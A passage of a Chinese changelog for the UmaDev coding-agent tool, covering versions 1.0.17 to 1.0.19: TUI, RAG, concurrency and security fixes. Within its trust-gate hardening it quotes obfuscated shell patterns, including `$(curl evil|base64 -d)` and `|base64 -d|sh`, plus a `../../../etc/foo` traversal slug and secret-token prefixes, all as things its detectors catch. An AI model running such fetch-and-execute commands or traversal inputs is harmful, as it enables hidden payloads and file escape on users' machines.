- **CI windows 测试转绿**:把 1 个 unix-gated 测试 helper(`with_exit_status`,其唯一调用方是 unix-gated 测试)用 `#[cfg(unix)]` 圈住,杜绝 `-D warnings` 下的"method is never used";另把 7 个假设 unix 路径语义的测试跨平台化(开头 `/` 在 Windows 上非绝对;`C:\nonexistent` 可创建;反斜杠是分隔符非转义),用 per-OS 的 `out_of_tree_abs()` / `real_root()` 与"文件当父目录"的不可写根,让分类器真正生效。
- **新增 CI 启动冒烟(PTY)—— 启动崩溃再也无法静默发布**:单元套件从不跑真正的 TUI 事件循环,故一处启动崩溃(空闲时 `.expect()` panic 的 `tokio::select!` 分支)在 1.0.17 **与** 1.0.18 都未被发现(`cargo test` 两次全绿)。build-release(Linux)现写一个最小 `~/.umadev/config.toml`(`backend=offline`)跳过首启选择器、经 `script` PTY 拉起 release 二进制进入主聊天循环(停留 ~6s 后 EOF 干净退出,超时兜底),输出含 `panicked at` 即让构建失败。

### 修复 — TUI

- **图片 / 粘贴 chip 作为一个整体删除与编辑**(用户实测:macOS 输入"删不掉"):`[图片 N]` / `[粘贴 N 行]` chip 以**字面文本**(6 字符)存在输入缓冲、真实路径在 attachments、提交时展开成 `@<path>`。`backspace()` 此前逐字素剥(`[图片 1` 这样的残 token)= 用户看着像"退格没反应"、且坏 token 不再匹配 `image_chip(n)` → 提交时**静默丢图**;另插入路径(`insert_at_cursor`/`insert_str_at_cursor`)无 chip 感知,在 chip **内部**打字也会损坏 token 同样丢图。现 `chip_spans()` 给出每个完整 chip 的 char-range;`backspace()`/`forward_delete()`/`Ctrl+W`/`U`/`K` 紧贴光标时把整个 chip 当一个单位删除并 `reconcile_attachments()`(按缓冲顺序重建、连续重编号,删中间也保持 `[图片 K]`↔attachments 耦合);插入点严格落在 chip 内部时也 reconcile(边缘插入保持完整)。
- **聊天轮进行中切底座(`/codex` 等)不再泄漏旧会话**:`slash_backend` 此前只守 `is_pipeline_active()`,但一个流式**聊天**轮是 `agentic_in_flight==true` / `is_pipeline_active()==false`,于是轮中 `/codex`/`/claude`/`/opencode`/`/offline` 让旧底座会话停泊与新底座预载相竞(泄漏会话 / 静默 UI 与底座不一致);现守 `is_pipeline_active() || agentic_in_flight`(is_busy),与 `/cancel` 对齐。
- **未终结的括号粘贴不再卡死输入**:一个未终结的括号粘贴(有 CSI 200~ 无 CSI 201~)此前永远 `in_paste==true` 并吞掉之后所有键;共享的 `after_in_paste_append` 在超过 `PASTE_BUF_CAP`(8 MiB)时强制闭合(把缓冲作为一次 Paste 交付),输入不会再卡死。

### 修复 — 核心流程

- **未完成的有意构建不再发出干净的交付证明包(H1)、断言被掏空不再当绿过(H2),外加 8 个路由 / 门 / 覆盖正确性修复**:H1 —— `run_final_gate` 的干净/脏结果**被丢弃**了:每步 Done 但最终门**脏**(掉了 FR / 契约漂移 / 运行时证明未验证)的分步构建照样 `finalize(clean=true)` = 一份把未完成构建包装成成功的证明包;现 `run_final_gate` 返回 `FinalGateOutcome{reply,clean}` 并 AND 进 finalize 门。H2 —— 断言**掏空**此前只数数没发现:`expect(add(1,2)).toEqual(3)` → `expect(true).toBe(true)` 保持计数;`count_trivial_true_asserts` 现在在计数恒定时也能发现 trivially-true 断言上升。另 8 处:重型 Bugfix/Refactor 在 lean 动词下的欠路由、`run_auto_qc` lean 短路按已执行 depth 而非重分类、跳地板要机器级运行证据(exit-0 / 具名 runner)、`impl_surface` 先 strip 项目根再判测试文件、`plan_state` 用 `id.trim()` 建 id 集(避免空白 padding 丢依赖边)、欠规格的证据条目保留为 Malformed→Gap 而非静默降级、PreviewConfirm 门按已执行计划是否含该步、`run_quality` 读已执行的 kind 等。

### 修复 — RAG(本地语义层)

- **随包本地 fp16 向量层不再静默全死 + 6 处检索修复**:HIGH —— `embed_inner` 未设截断,任一 curated 段超 512 token 就让 candle Err → `embed_texts` 返回 None,而 `embed_batch` 把整个语料发一次调用 → 一个长段落让整批为空 → 回落 HTTP → 默认安装无 key → 宣传的**本地 fp16 层只要任一段超 512 token 就静默关闭**(只剩 BM25,标准文档很常见);现 token id 先按模型 `max_position_embeddings`(读 `config.json`,兜底 512)截断,且每条文本**独立**嵌入、失败行零填充,只有整批全败才返回 None。另:向量通道做**阶段过滤**(融合后再 `filter_by_phase`);`quality_score` 加权后**重排**(此前附了不排序);chunk 下标 BM25↔向量缓存**错位**用稳定路径排序 + 语料指纹解决(签名不符则跳过向量融合,降级 BM25 绝不误 attribute 命中);chunker 识别**代码围栏**(围栏内的 `##` 不再劈段 / 伪造标题);repomap 跳块注释 / docstring 内的声明行;BM25 过取后截断对称化。

### 安全

- **自有 SAST 密钥检测器现在抓得到人们真正泄漏的密钥**:始终在场的自有基线密钥扫描(没有 gitleaks 也让 UmaDev 不失明的地板)此前有大量漏报。补齐:空格 / JSON-key 形式的赋值(`const API_KEY = "x"`、`"apiKey": "x"`)+ 真正的 Shannon **熵兜底**(20+ 字符高熵引号字面量,跳过 hex/UUID/URL/SRI/占位);OpenAI `sk-` key;PEM 私钥;对 config/IaC/env 文件(`.env`/`.json`/`.yaml`/`.toml`/`.tf`/`Dockerfile`/`.ini`/`.properties` —— 泄漏重灾区)的第二遍扫描;更多 token 家族(`ghs_`/`ghu_`/`ghr_`/`github_pat_`/`glpat-`/`AIza`/`xox[bpars]-`/`SG.`/`npm_`/`ASIA`);硬编码长效 JWT。`scan_owned_sast` 在 0 文件时报 **Skipped** 而非"扫了个空也算 Clean"。治理仍 fail-open(从不报错 / panic),但**安全扫描绝不在空 / 错时报 Clean**;审计仍只记长度 + 名/前缀标签,绝不记原值。

### 修复 — CLI/MCP

- **关掉 6 个 CLI/MCP 审计 bug(含 `pr --create` 的 `git add -A` footgun)**:`pr --create` 此前 `git add -A` 把整个脏树(无关 WIP / 误入的密钥 / 构建垃圾)都扫进推送的提交、且 `--yes` 下完全无提示;现 `pr_artifact_paths` 只返回本次运行自有交付物(`output/`、`release/`)的白名单,`git add -- <白名单>`(pathspec 限定,够不到脏树),确认列出确切要提交的内容,`--yes` 下同样生效。`ci --changed-only` 改扫**暂存索引**(`git diff --name-only --cached` + `git show :file`)而非工作树(一个未暂存的违规不再中止一个不含它的提交,这正是它驱动的 pre-commit 钩子该有的范围);MCP `contract_check` 的 slug 加单 Normal 组件守卫(`../../../etc/foo` 逃逸 `output/`);`check_claude_hook` 改解析 JSON、确认精确是 UmaDev 的 PreToolUse matcher 且磁盘可解析(否则 Warn,不再凭子串就 PASS);`is_umadev_hook_command` 精确匹配程序 token(不再把用户的 `my-wrapper hook pre-write` 当 UmaDev 的悄悄剥掉);`add_knowledge` 跳过软链接 `.md`(`symlink_metadata` 不跟随)、不再因一个就 `?` 中止整个 add。

### 修复 — 并发

- **一处 HIGH UB 数据竞争换成线程安全共享状态**:TUI 在**运行时**从 `/logs`/`/model`/`/sandbox` 改进程全局 env(`std::env::set_var`/`remove_var`),而进程内底座驱动的 tokio 任务并发 `std::env::var` 同样的变量 —— setenv/getenv **非线程安全**(glibc 数据竞争 / UB,可 segfault 或读到已释放的 environ 槽),一个普通切换在流式时就能触发。3 个 live-config 变量改成**线程安全共享状态**,启动时从 env 播种一次(外部启动覆盖仍生效)、运行时再不 set:过程日志 flag → `OnceLock<AtomicBool>`;codex 沙箱 → `OnceLock<RwLock<Option<String>>>`;模型档 → `OnceLock<RwLock<ModelTiers>>`;fail-open(锁中毒 → no-op/默认)。
- **自学习记忆文件的丢失更新竞争收口**:`dev-errors.jsonl` 被 `lessons.rs` 里 6 个函数读-改-写,锁却**不一致**(`capture_dev_errors` 与 `record_pitfall_strategy` 各持**不同**的函数局部静态锁、互不排斥,另 4 个**完全无锁**);原子 temp+rename 防住了撕裂文件却防不住**丢失更新**(两个并发读-改-写各读状态 S、各自变更、后写的 rename 盖掉前者 → 静默丢课程 / 失效更新,并行文档扇出的两个 fork 让这竞争真实存在)。现一把模块级 `DEV_ERRORS_LOCK` 在 `read_raw_lessons` 前获取、贯穿到 `write_raw_lessons`,使整段读-改-写在 6 个 mutator 间**跨函数原子**;经 `PoisonError::into_inner` fail-open(锁中毒可恢复,绝不 panic 进宿主),只读召回路径不动、守卫从不跨 await。

## [1.0.19] — 紧急修复:1.0.17/1.0.18 启动即崩溃的致命退化

**1.0.17 与 1.0.18 一启动就 panic、应用完全无法运行**(用户实测 macOS / Windows 均复现)。`tokio::select!` 的分支表达式**每轮都会被求值** —— `if` 守卫只决定是否 poll、不阻止求值。取消-drain 分支在 1.0.17 的 M1 修复里被从惰性 `async {}` 块改成了直接函数调用 `drain_cancelled_task(cancel_drain.as_mut().expect(…), …)`,于是空闲时 `cancel_drain` 为 `None`、启动第一轮循环即 `.expect()` panic。现改回惰性 `async {}` 块,只有真正 poll(守卫为真)时才访问 `cancel_drain`,并新增 PTY 启动冒烟验证以杜绝同类退化。**请所有 1.0.17 / 1.0.18 用户升级到 1.0.19。**

### 修复
- **致命:启动即 panic(`crates/umadev-tui/src/lib.rs`)** —— `tokio::select!` 分支表达式被急切求值,空闲时(`cancel_drain == None`)`cancel_drain.as_mut().expect(...)` 立即 panic;改回惰性 `async {}` 块,仅在守卫为真、真正 poll 时才访问 `cancel_drain`。新增 PTY 启动冒烟检查。

## [1.0.18] — 前沿强化五连(每步可证伪 / 不确定即失败关闭 / 记忆字节有界 / 缓存稳定固件 / 裁判全新会话)· 用户反馈全修(端口冲突 / 过程日志尾部 / 信任 / 提问桥接)

把"真 Agent 化"的五项前沿能力(F1–F5)各自从"大体已对"夯到"可证伪 / 失败关闭 / 有界 / 钉死",其中最深的一项是 **F2 裁判独立性的根因修复**:只读裁判此前在宿主层就继承了 doer 的全部推敲,现改为开一个**全新独立只读会话**,在真正干净的上下文上评审。配套把用户实测反馈(@Excellent)一次性修齐:**预览端口冲突卡死**、**长构建过程日志保留尾部**、**信任档误拦校验管道**、**AskUserQuestion 真接线**。最后给发布工作流加上 HuggingFace 下载重试,杜绝瞬时 429 打断 GitHub Release。

### 新增 — 前沿强化

- **每步可证伪的证据契约(F1)**:`verify_step_acceptance` 此前把每步的 `AcceptanceSpec` 映射成**整仓**检查(`SourcePresent`='任何地方存在源码'、`BuildTest`='整个项目能构建'),于是"建登录路由"这一步会因为**别处**已有源码而过 —— 底座的"看着完成了"在单步粒度上被实际信任。新增 `EvidenceContract` 枚举(`SourcePresent` / `BuildClean` / `ContractMatches` / `FileExists{path}` / `FileContains{path,needle}` / `TestPasses{name}` / `RouteResponds{method,path,status}`),是 `AcceptanceSpec` 的确定性子集伴侣:大脑在计划 JSON 里**提议**每步证据,UmaDev **解析并拥有**(`BrainStep.evidence` 容错解析,一条坏条目不会废掉整个计划;`PlanStep.evidence` 为 `#[serde(default)]`,旧 `plan.json` 仍可加载)。`verify_step_evidence` 把每个 producer(构建 / 测试、经 `runtime_proof` 的运行时启动、契约)**至多预算一次**,逐条声明检查 → Pass/Skip/Gap:全部成立才算完成(任一 Gap → 该步未完成)、不可检查的 Skip 中性 fail-open、每个 Gap 都被诊断('声明 file-exists src/App.tsx 但该路径不存在'),返工指令精确告诉 doer 该核对哪些文件 / 测试 / 路由;空证据回落既有验收(fail-open)。复用既有确定性 producer,无新探测设施;四不变量 + 地板完整。
- **不确定即失败关闭的不可逆动作边界 + 连败熔断(F3)**:`reversibility_class` 此前以 `Reversible` 兜底,于是一个**因混淆而**躲过每次 token 扫描的命令 —— `eval "$(echo <b64>|base64 -d)"`、`…|base64 -d|sh`、`bash -c "$payload"`、内联 `-c` 解释器、`\x` 字节串、反引号替换 —— 读作安全、在 Auto/Guarded 被**静默放行**(一个隐藏的破坏性载荷过了地板)。修复 1(失败关闭许可):新增 `Reversibility::Uncertain`(`always_escalates`)+ `command_is_obfuscated()`;`reversibility_class` 对非空、躲过具体扫描**但混淆**的命令返回 `Uncertain` —— 置于破坏性 / 网络 / VCS **之后**(可见的危险 token 仍先胜出),只有真正不透明的命令才落到这里;三个地板入口都已 gate 在 `always_escalates()` 上,故该许可在**每一档**(Plan/Guarded/Auto)都失败关闭、`Uncertain` 动作绝不被记忆 / 自动放行。fail-**OPEN** 的建议性规则(emoji / 颜色 / slop / 裁判)不动。修复 2(熔断):`ConsecutiveFailureBreaker` + `CONSECUTIVE_FAILURE_THRESHOLD=3` 计同类失败(build-verify / review-verify)、成功 / 异类即重置、触发即闩锁 + 诊断;接入 `drive_plan_steps`,逐步失败时提前以一条 typed Note 收尾 → `finalize(clean=false)`(不假报成功),而非磨到 `MAX_STEP_TRANSITIONS`。+i18n `trust.reason.uncertain`。强化 UD-FLOW-008(无新增条款)。

### 改进 — 前沿强化

- **裁判开全新独立只读会话 —— 根因修复 maker-checker 推理泄漏(更深的 F2)**:1.0.17 的 F2 prompt 防火墙把 doer 的推敲挡在了裁判之外,但**根因在 fork 机制**:claude 经 `--resume <main> --fork-session`(重载 doer 的完整转录再分支)、codex 经 `thread/fork{ephemeral}` + `thread/resume`(重载主线程)分叉,于是只读裁判**继承了 maker 的全部推敲**;只有 opencode 本就开全新独立会话、只读盘上的黑板(参照)。claude/codex 的 fork 都以 `current_dir(workspace)` 启动,故全新会话仍看得到产物(`output/*.md` + 源码),而裁判指令本就经 `CriticArtifacts` 携带 —— 没有底座需要兜底。修复:claude `fork_session_args` 起全新 `--session-id`、**无** `--resume` + **无** `--fork-session`(保留 `--permission-mode plan` + `--allowedTools Read,Grep,Glob`);codex `fork()` 经 `thread/start` 在只读沙箱里开全新线程(新 `thread_start_params_readonly` + `fork_start_handshake`),移除 `thread/fork` 探测 + 现已无用的 `thread_fork_params`/`thread_resume_params`/`fork_probe_timeout`(`UMADEV_CODEX_FORK_PROBE_SECS`)。契约不变(只读、有界握手、fail-open→`ForkUnsupported`、并行安全、`kill_on_drop`);F2 防火墙变双保险。opencode 不动。测试断言无 `--resume`/`--fork-session`(claude)+ `thread/start`-非-`fork`/`resume`(codex)。`#![forbid(unsafe_code)]` 不破。
- **注入的记忆增量手册字节有界(F4)**:UmaDev 的固件记忆层**本就**是增量手册而非原始 episode —— 限条(`select_relevant_lessons` ≤3)、蒸馏 + 去重(`fold_beliefs` 把近似课程聚成一条带 `evidence_count` 的高层规则、召回时降级原始证据;`capture_dev_errors` 经 `normalize_signature` 把复发折叠成 occurrences;reflections 在真复发上产出 'next time do X instead of Y' 的 `next_strategy`)、按频率 × 新近排序(`lesson_decay_score`:relevance×importance×30 天半衰×trust)。唯一缺口:`relevant_lessons_for_prompt` 限了**条数**却无**字节**预算 —— 在 `compose_firmware` 内 `FirmwareBuilder` 会遮掩,但直接注入的调用方(`runner.rs`、`director_loop.rs`×2)是把字符串**裸注入**的,而一条 belief 的代表性修法刻意取**最长**成员修法(`fold_one_cluster` `max_by_key` len)、`fix`/`root_cause` 无界,3 条肥增量 = 对这些调用方的一堵塌缩上下文的墙。修复:命名 `MEMORY_PLAYBOOK_MAX_DELTAS=3`(替掉魔数 3/2)+ 硬性 `MEMORY_PLAYBOOK_BUDGET=3000` 字预算 —— `relevant_lessons_for_prompt` 高分优先组装、丢掉会溢出的低分增量、对最高分单条做头部截断兜底,故该块对**每个**调用方按条数 + 字节双重有界(header 字节相同、确定性、fail-open 不变)。
- **KV 缓存稳定的固件前缀钉死 + 计划进度复述(F5)**:`compose_firmware` **本就**先发稳定块(identity → 输出语言 → craft 律 → 反 slop 律 → user-charter)再发易变块(项目事实 → app-runtime → repo-map → 踩坑 → 知识),每个易变块确定性排序(事实插入逆序、课程 decay-score+mtime、知识 BM25、repo-map 度中心性)—— 前缀里无 HashMap 迭代 / 时间戳,故领头前缀在仅易变输入不同的轮次间**字节稳定**(缓存最优,无需重排);`FIRMWARE_BUDGET`/`ALWAYS_ON_RESERVE` 有界。一处缺口:**目标**每步都复述(`step_goal_frame` 重贴需求),但**计划位置 / 后续步**没有。改动:`context.rs` 文档化该不变量(KV-cache-stable-prefix 模块文档 + STABLE→VOLATILE 边界注释,使未来编辑无法悄悄把易变块挪到前缀)+ 锁测试(仅头部 compose 是完整 compose 的字节级前缀;两个不同易变尾共享字节相同前缀;编译期 const-assert 钉死预算关系)。`director_loop.rs` 加 `plan_progress_recitation`(有界一行 'M 步已完成 N 步;接下来:<后两步标题,头部裁切>';≤1 步 / 末步 fail-open),串进 `drive_build_step` 的第 0 轮指令 + 每次返工再驱动,长多步构建里底座不再跑偏。无生产重排、无快照变更。

### 修复 — 用户反馈(@Excellent)

- **预览开发服务器在端口被占时不再卡死(2899s 卡死 + 6 次重跑 `npm run dev`)**:诊断(`run_runtime_proof` → `wait_until_ready`):(1) 子进程以 stdout/stderr=null 启动,UmaDev 对 'Port 3000 is in use … using available port 3002'、'Another next dev server is already running … PID 7928'、EADDRINUSE 完全**失明**;(2) 就绪 curl 探测的是**假定**端口(3000)—— 一个占着 3000 的陈旧进程秒答,UmaDev 就对**陈旧**服务器误报 Verified(而自己已挪到 3002,或烧满 60s);(3) 无冲突处理 / 无清理 / 无归属,故 proof 从不确定性返回,总监把这个失明步骤重发约 6 次(每次 `npm run dev` 永不退出)= 2899s 卡死。修复:捕获 + 扫描输出(`scan_dev_line` → `DevSignal::{Ready,PortFallback,Conflict}`);'using available port Y' 行重指探测 URL(`replace_port`)、'Local: http://…:PORT'/'listening on PORT' 提取真实绑定端口;`wait_for_boot` 在**一个** `READY_TIMEOUT_SECS` 截止内读扫描行(cancel-safe mpsc)**并** curl 轮询有效 URL(文本就绪先经 curl 确认才采信),单次启动无重跑循环,未绑定 → typed 诊断 'did not bind within 60s — a leftover process may hold the port'(不是卡死);经 `.umadev/preview.pid` 保守回收**自己记录**的 PID(只杀我们记过且仍存活的,绝不杀外部 / 未知进程;启动时跑 + 完成时拆除,使它不会成为下一个 leftover);外部服务器仍答则复用不重开。fail-open(始终返回 `RuntimeProof`,从不 Err/卡死);序列化 proof 形状不变。
- **`/logs` 保留长构建的尾部而非头部**:进程日志可见(16KiB verbose 上限)时,长构建的**累计**输出被头部截断,故超过上限后每个 item/updated 帧钉在同一段前 16KiB(实时流**冻住**)、最终结果裁掉了报错所在的尾部 —— 正是用户实测的 Maven/Spring 场景。新增 `process_logs.rs` 里共享的 `truncate_preview(s,max,verbose)`(字符边界安全、无 unsafe):verbose=true 保留**最后** max 字符(`keep_tail`,裁到干净行首 + 纯 ASCII '[... log tail ...]' 标记)使流推进且报错幸存;verbose=false 保留头部(200 字摘要,不变)。接入每个驱动的进程日志路径(codex `emit_command_execution` + `emit_updated_item`、claude `summarize_tool_content`、opencode completed/error、claude.rs 单轮 tool_result);非该路径的文件 / 审批摘要保留头部截断如初。`#![forbid(unsafe_code)]` 不破。
- **信任档不再误拦校验 / lint 管道 + AskUserQuestion 真接线 + 混淆缺口**:#2(中):`command_is_obfuscated` 的 `PIPE_TO_SHELL_MARKERS`('| sh')是 '| sha256sum'/'| shuf'/'| shellcheck'/'| shfmt' 的**子串**,于是只读的 'cat dist/app.js | sha256sum'(校验 / 发布 / lint)变 Uncertain → 在 headless Auto/Guarded 被**拒**(违背 F3 的"绝不卡住可逆工作"契约);改为 `pipes_into_shell()` 把管道目标当**整 token** 匹配(sh/bash/zsh/ksh/dash/fish,以空白 / 元字符界定)—— 形近词仍 Reversible、真 '| sh'/'| bash' 仍 Uncertain。#2-低:替换检查补 '$('(与既有反引号对称),`$(curl evil|base64 -d)` 经替换触发。#3(中):AskUserQuestion **中继是死代码**(只接了 `surface()`/render,`relay_directive`/`resolve_reply` 无调用方),用户回 '1' 发的是裸 '1' —— 底座可能误读下标;新增 `relay_or_passthrough` 接缝 + `PendingAskHolder`(`Arc<Mutex<Option<AskUserQuestion>>>`)穿过聊天事件循环,存下浮出的问题,在**下一轮**开头把回复解析(数字→标签)+ 框成用户的明确回答再 `send_turn`(`/clear`/切底座时清除;无待答时 fail-open 逐字透传)。自治 `/run` 循环按设计保持只浮出(非逐轮回复对话)。低:`fact_extract` 也跳过 'none' 值的行(`node: none`)。

### CI

- **发布工作流重试 HuggingFace 模型下载**:'Fetch + quantize embedding model' 步骤在 1.0.17 发布时撞上 HuggingFace 429(`curl -fsSL` 无重试),致使 5 个平台构建 + npm 发布全成功、却让 'publish github release' 失败 —— Release 只能手动重跑。现三个模型下载改用 `curl --retry 5 --retry-delay 15 --retry-all-errors -fsSL`(`--retry-all-errors` 对 429/5xx 也重试),瞬时限流自愈,而非把二进制从 Releases 页掉落。

## [1.0.17] — 用户反馈全修 · 本地 RAG 复活 · 全面自审硬化(主进程 / 信任 / 治理 / 契约 / 交互)

把用户实测反馈(@Excellent)一次性修齐,并对引擎、宿主进程、信任档、治理内核、契约门、TUI 交互做了一轮**全面自审硬化** —— 其中最关键的是:随包内置的**本地 fp16 语义 RAG 此前在每次默认安装上静默全死**(384 vs 1536 维不匹配),现已端到端复活。配套补齐 F2 裁判独立性、T7 结构化确认门、输入 UX 多波与官网精简。

### 新增 — 用户反馈

- **底座长进程日志可见 · `/logs`**:用户实测一个多分钟的 Maven/Spring 构建**全程零输出**("日志被沙箱重定向吞掉了")。根因不是沙箱不可恢复重定向,而是底座在自己的 agentic 循环 + 沙箱里跑长命令、只在**完成时**把结构化事件交给 UmaDev 且**裁到 200 字** —— 对 codex(用户的底座)`item/started` + `item/updated` 帧此前被完全忽略,多分钟构建期间一行都不出(连"正在跑 mvn"都没有)。新增 `process_logs.rs`(`UMADEV_SHOW_PROCESS_LOGS`,上限 200→16KiB)+ `/logs` 斜杠命令(**默认关**)。开启后:codex 在 `item/started` 即发 Bash 工具行(运行指示立刻出现)+ 在 `item/updated` 把增长的 `aggregatedOutput` 串进转录 + 完成给全量(无重复行);claude/opencode 把完成上限放宽到全量构建日志;TUI 保留并展开 Bash 行全量输出。关闭(默认)= 与此前完全一致。
- **AskUserQuestion 桥接到用户**:用户实测底座的 `AskUserQuestion` 工具只渲染一个**裸 stub** 并**静默自动取消**。诊断:底座自己 headless 跑该工具(`claude --print` / 持续会话),渲染不了自己的选择器 → 半途自动取消;UmaDev 的 detail-builder 此前只认 `file_path/command/path/url/pattern` 而不认 `questions:[…]` → 只出一行裸 `AskUserQuestion`,被读成静默取消。UmaDev 无法为底座自执行的工具注入工具结果,故可行的桥是**同会话续接**:渲染问题 + 全部选项,用户回复作为下一轮流回**同一会话**(底座的上下文里仍持有该问题)。新增 `umadev-runtime` AskUserQuestion 解析器 + `umadev-agent` `ask_question.rs`,接入全部路径(continuous / director_loop / tui chat / host claude),给出真正的一行工具行 detail + 醒目的本地化 Note(问题 + 每个编号选项 + "回复你的选择,会转发给底座 —— 在等你回答,不是取消"),覆盖三家底座,additive / fail-open。
- **记忆主动记录 · `facts.jsonl` 可靠生成**:用户实测 `.umadev/memory/facts.jsonl` **从不出现**。事实记忆此前**每轮召回**、但**记录**只**指示底座**经固件去写文件 —— 底座常常不写,文件就从未生成、召回也无米下锅。新增 `fact_extract.rs`:在一次有意义的**工作轮**后,`maybe_extract_facts` 在任何 fork **之前**门控(跳过即零 token:`route_warrants_extraction` 跳过 Chat/Explain,再加节流),复用与裁判完全相同的 `fork_with_timeout` 接缝,在**只读 fork** 上让大脑把本轮持久事实枚举成 `key:value` 行(`ForkConsult::judge_text`,逐字指令、有界排干、fail-open),容错解析(项目符号 / markdown / 全角冒号,上限 24)后经 `project_facts::record_facts` 去重落盘。节流:第 1 轮(一步构建也能填充)然后每 3 个工作轮一次。处处 fail-open(失败 / 离线 / 空 fork → 0 事实,从不弄坏当轮);既有的召回 + 固件指引不动(底座仍可直接写,这是主动兜底)。
- **被构建 App 的运行时模型可配**:用户反馈 UmaDev 把**开发底座**(借来写代码的大脑)与 **App 的运行时模型**混为一谈 —— 即便用户想用 Qwen Max 作运行时引擎,生成的 AI App 也被写成调 Claude(`ANTHROPIC_API_KEY`),逼用户手改 backend。新增 `app_runtime.rs`(确定性、fail-open、无 I/O):`app_calls_llm_at_runtime`(中英信号,对 rag/gpt/llm/glm/agent 词边界安全)、`stated_runtime_model`(规范化厂商标签:Qwen/DashScope/DeepSeek/智谱/月之暗面/文心/豆包/混元/Gemini/Claude/本地 Ollama)、`runtime_model_directive`(把 App 的运行时模型 + API 当**用户可配置项** —— provider 抽象层,model id + base URL + key 走 env,优先 OpenAI 兼容客户端,**默认用户指定的模型**,绝不悄悄硬编码开发底座厂商;非 AI 构建为空 = 零 token)。接入 `compose_firmware`(工作类头部)+ `director_build_directive`(精简 + 完整 `/run`)。+知识标准 `app-runtime-model-configurable.md`(quality_score 95)。
- **「中文导出不乱码」知识标准(RFC 5987/6266)**:用户实测报告里中文文件名触发 `UnicodeEncodeError`。新增 `backend/01-standards/cjk-in-exports-and-documents.md`,把"中文导出不乱码"当**硬交付门**,逐格式给确定性修法:CSV 必须 UTF-8 **带 BOM**(Excel/WPS 正确显示中文)+ 分隔符 / 引用 / CRLF / 前导零 / 公式注入坑;xlsx 优先(UTF-8 原生 + CJK 单元格字体);PDF base-14 字体**无 CJK 字形**,必须嵌入并注册 Noto-Sans-CJK 子集(+ 瘦容器缺字体陷阱、CJK 断行);HTML/网页下载需 `charset=utf-8`、正确 MIME、`Content-Disposition` **RFC 5987** `filename*=UTF-8''`(根治上报的中文文件名 bug)。泛化到任意非 ASCII(JA/KO/RTL/重音),+反模式 + 真机验证清单;与 i18n 簇双向交叉引用。quality_score 95。
- **T7 结构化确认门选择器**:确认门除自由文本外渲染**带标签的 TUI 选择器**。新增 `gates.rs`:`GateDecision{Approve,Revise,AddMore,Cancel}`、`GateChoice{question,options}` 以 i18n **key** 承载(语言无关);`GateChoice::standard` 给 docs / preview-confirm 一个 Approve/Revise/AddMore 选择器。`EngineEvent::GateOpened` 增加 `choice:Option<GateChoice>`。TUI 在暂停的 GateOpened 路径武装选择器(↑↓ 环绕 / 1-9 直选 / Enter 确认,仅在输入框为空时激活),用 ▸ 标记渲染在实时计划区(主题色、无 emoji);决策映射到既有流程(Approve→Continue + 信任放行;Revise/AddMore→保持门开、自由文本;Cancel→取消)。自由文本共存,`choice:None/empty` → 完全等同此前的自由文本门(fail-open)。

### 新增 — 交互与自进化

- **输入 UX 多波**:`Ctrl+R` 反向 i-search 模糊历史搜索 + **fzf 式排序**(无依赖打分:ASCII 折叠、词边界 / 驼峰 / 连续命中加分、间隙 / 跳首扣分,接入 palette + @-mention 匹配,层内按分稳定排序);空框 + 有排队消息时 `Up/Esc` **召回最近排队消息**编辑;首启示例占位提示(指向真实最近改动的源文件,会话稳定轮换);软换行感知复制(复制时重接软换行视觉行、只在真实逻辑断点换行)+ 超长展开输出折叠(120 行上限 + `Ctrl+O`)+ 干净退出时把对话**交回终端滚动缓冲** + `TMUX` 下 OSC52 透传(SSH+tmux 复制可用)。
- **自进化:预测规模标定**:新增 `sizing_calibration.rs`(仿 `first_pass`:原子写、互斥、fail-open、最小样本、类上限),给路由 / 规划的**复杂度定规模**打分(这次路由是定轻了还是定重了),与首过验收率(它评分的是验证存活率)互补。`SizeRank{Trivial<Light<Heavy}`、按类 `ClassSizing{samples,under,over}` 落 `.umadev/sizing-calibration.json`;仅在 ≥5 样本 + 主导误判方向 ≥0.5 时提示一步微调。在 `director_loop` 真实结果已知处记录,每次运行恰好一条。**仅 advisory**(一条测试断言 `for_run` 在强信号有无下产出**字节级相同**的路由,地板从不咨询它)。

### 改进

- **F2 maker-checker 独立性 —— 裁判在干净上下文上评审**:裁判 prompt 本就只看产物(`CriticArtifacts` 无 doer-reasoning 字段),**但**只读 fork **继承主会话** —— claude-code 经 `--resume <main> --fork-session`、codex 经 `thread/fork{ephemeral}` 都分叉了活的对话,把 doer 的全部推敲带进评审窗口(自偏好 / 框架泄漏);只有 opencode 开了全新独立只读会话(参照)。在 `umadev-agent` prompt 边界修复(宿主 fork 语义另案跟进):新增 `INDEPENDENT_REVIEW_FIREWALL` 前置 + `compose_review_directive(system,user)` 把防火墙置首(把任何继承的对话 / 计划 / 作者注释 / 思维链当 maker 的私货 → 忽略;只从自己的席位判断供给的产物 + 验收 + 需求),再接角色的严格 JSON 系统提示与只看产物的种子。`ForkConsult::judge` 把所有产物评审路径都过它;`judge_json`(路由 / 规划定规模)不动。结构化 `RoleVerdict` + 只读并行评审 + 确定性 advisory 汇总 + 四不变量完整;fail-open。
- **知识库卫生两波**:修系统性 **slug-as-title** frontmatter bug(**75 文件**:48 个 method-card / deep-dive 的 `title`=id-slug、`category`=带 `.md` 的文件名、垃圾 tags、slug H1 —— 收成一个干净 `# 真标题` + 真分类 + 重建 tags;另 27 个仅 category 修复)。标定**质量分**(**49 文件**:~21 份被低估的商业级文档从默认 70 重打到真实 83-93,3 个薄 stub 提到 95,清掉模板 `#` 注释块 / `Excellent()` 占位垃圾 / 彩色 emoji 标记(对勾 / 叉 / 警告)→ `[推荐]/[避免]/[注意]` 文本)。无来源标注、无 PII。
- **官网精简**:更简洁大厂风的 `/changelog`(缩短每条标题 + 重排清爽布局);3 个滚动 hero 标题缩成 3 行短句叠层、`.hero h1` 改 `word-break:normal` + `overflow-wrap:anywhere`,根治手机端最长中文行无法在窄列换行造成的横向滚动陷阱(轮播看似"卡住");375px(中 + 英)0px 行溢出、轮播三屏循环干净。

### 修复 — 用户反馈

